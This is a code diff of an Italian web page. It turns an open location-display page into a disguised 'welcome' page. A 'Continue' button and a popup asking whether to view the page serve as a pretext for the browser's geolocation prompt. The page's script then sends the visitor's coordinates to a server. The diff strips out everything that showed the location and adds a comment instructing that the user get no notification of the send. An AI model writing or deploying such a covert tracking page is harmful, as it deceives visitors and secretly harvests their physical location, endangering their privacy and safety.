@@ -1,20 +1,96 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Rivela Posizione</title>
+    <title>Pagina di Benvenuto</title>
+    <!-- Includi CSS di Bootstrap -->
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        #popup {
+            display: none;
+            position: fixed;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            text-align: center;
+        }
+        #loader {
+            display: none;
+            border: 16px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 16px solid #3498db;
+            width: 120px;
+            height: 120px;
+            animation: spin 2s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .content-wrapper {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            height: 100vh;
+            padding-top: 50px;
+        }
+    </style>
 </head>
-<body>
-<h1>La tua posizione attuale</h1>
-<p id="location">Ottenendo la posizione...</p>
+<body class="d-flex flex-column align-items-center justify-content-start vh-100">
+
+<div class="content-wrapper text-center">
+    <h1>Benvenuto</h1>
+    <p>Clicca sul pulsante qui sotto per continuare.</p>
+    <button id="continue-button" class="btn btn-primary">Continua</button>
+</div>
+
+<div id="popup" class="p-4 border rounded">
+    <p>Vuoi visualizzare la pagina?</p>
+    <button id="yes-button" class="btn btn-success">Si</button>
+    <button id="no-button" class="btn btn-danger">No</button>
+</div>
+
+<div id="loader" class="position-fixed"></div>
+
+<!-- Includi JS di Bootstrap e dipendenze -->
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
 
 <script type="text/javascript">
+    document.getElementById("continue-button").addEventListener("click", function() {
+        document.getElementById("popup").style.display = "block";
+    });
+
+    document.getElementById("yes-button").addEventListener("click", function() {
+        document.getElementById("popup").style.display = "none";
+        document.getElementById("loader").style.display = "block";
+        getLocation();
+    });
+
+    document.getElementById("no-button").addEventListener("click", function() {
+        document.getElementById("popup").style.display = "none";
+    });
+
+    function getLocation() {
+        if (navigator.geolocation) {
+            console.log("Richiesta di geolocalizzazione inviata.");
+            navigator.geolocation.getCurrentPosition(showPosition, showError);
+        } else {
+            console.error("Errore: Geolocalizzazione non supportata");
+            alert("La geolocalizzazione non è supportata da questo browser.");
+            document.getElementById("loader").style.display = "none";
+        }
+    }
+
     function showPosition(position) {
         console.log("Posizione ottenuta: ", position);
-        var locationElement = document.getElementById("location");
         var latitude = position.coords.latitude;
         var longitude = position.coords.longitude;
-
-        locationElement.innerHTML = "Latitudine: " + latitude + "<br>Longitudine: " + longitude;
 
         // Invia la posizione al server
         var xhr = new XMLHttpRequest();
@@ -27,11 +103,10 @@
                 if (status === 0 || (status >= 200 && status < 400)) {
                     // La richiesta ha avuto successo
                     console.log("Posizione inviata con successo al server");
-                    alert('Posizione inviata con successo al server!');
+                    // Non mostrare nessuna notifica all'utente
                 } else {
                     // C'è stato un problema con la richiesta
                     console.error("Errore nell'invio della posizione al server: ", xhr.responseText);
-                    alert('Errore nell\'invio della posizione al server: ' + xhr.responseText);
                 }
             }
         };
@@ -43,40 +118,21 @@
     }
 
     function showError(error) {
-        var locationElement = document.getElementById("location");
         switch(error.code) {
             case error.PERMISSION_DENIED:
-                locationElement.innerHTML = "L'utente ha negato la richiesta di geolocalizzazione.";
                 console.error("Errore: Permessi negati");
                 break;
             case error.POSITION_UNAVAILABLE:
-                locationElement.innerHTML = "Le informazioni sulla posizione non sono disponibili.";
                 console.error("Errore: Posizione non disponibile");
                 break;
             case error.TIMEOUT:
-                locationElement.innerHTML = "La richiesta di ottenimento della posizione è scaduta.";
                 console.error("Errore: Timeout");
                 break;
             case error.UNKNOWN_ERROR:
-                locationElement.innerHTML = "Si è verificato un errore sconosciuto.";
                 console.error("Errore: Errore sconosciuto");
                 break;
         }
     }
-
-    function getLocation() {
-        if (navigator.geolocation) {
-            console.log("Richiesta di geolocalizzazione inviata.");
-            navigator.geolocation.getCurrentPosition(showPosition, showError);
-        } else {
-            document.getElementById("location").innerHTML = "La geolocalizzazione non è supportata da questo browser.";
-            console.error("Errore: Geolocalizzazione non supportata");
-        }
-    }
-
-    window.onload = function() {
-        getLocation();
-    };
 </script>
 </body>
 </html>
